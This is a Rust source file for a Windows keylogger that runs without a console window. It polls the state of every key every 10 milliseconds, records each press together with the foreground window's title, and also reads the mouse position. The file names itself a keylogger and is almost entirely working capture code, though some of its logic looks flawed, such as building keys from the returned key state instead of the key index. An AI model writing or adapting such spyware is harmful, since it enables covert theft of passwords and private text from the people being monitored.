#![windows_subsystem = "windows"]

use chrono;
use hostname;
#[cfg(windows)]
use winapi;

use crate::event::Event;
use crate::keys::{Key, Position};

mod keys;
mod event;

#[cfg(windows)]
pub fn pressed() -> Vec<Event> {
    use winapi::um::winuser::*;
    use winapi::ctypes::c_int;
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::psapi::GetProcessImageFileNameW;
    use winapi::um::winnls::GetUserDefaultLocaleName;
    use winapi::shared::minwindef::DWORD;
    use winapi::um::winnt::PROCESS_QUERY_LIMITED_INFORMATION;
    use std::{thread, time::Duration};

    loop {
        thread::sleep(Duration::from_millis(10));

        let hwnd = unsafe { GetForegroundWindow() };

        let pid = unsafe {
            let mut p = 0 as DWORD;
            GetWindowThreadProcessId(hwnd, &mut p);
            p
        };

        let handle = unsafe {
            OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
        };

        let title = unsafe {
            let len = GetWindowTextLengthW(hwnd) + 1;
            let mut t = String::from("__NO_TITLE__");

            if len > 0 {
                let mut buf = vec![0 as u16; len as usize];
                GetWindowTextW(hwnd, buf.as_mut_ptr(), len as i32);
                buf.remove(buf.len() - 1);
                t = String::from_utf16_lossy(buf.as_mut());
            }

            t
        };

        let mut events = vec![];
        for i in (0 as c_int)..255 {
            let key = unsafe { GetAsyncKeyState(i) };

            if (key & 1) > 0 {
                &events.push(
                    Event::new(Key::from(key as u8), title.clone())
                );
            }
        }
        if events.len() > 0 {
            return events;
        }
    }
}

fn get_mouse_pos() -> Position {
    use winapi::um::winuser::*;
    use winapi::shared::windef::POINT;

    let pos = unsafe {
        let mut p = POINT { x: -1, y: -1 };
        GetCursorPos(&mut p);
        p
    };

    (pos.x, pos.y)
}

#[cfg(not(windows))]
fn pressed() {
    println!("This keylogger only works on windows");
}
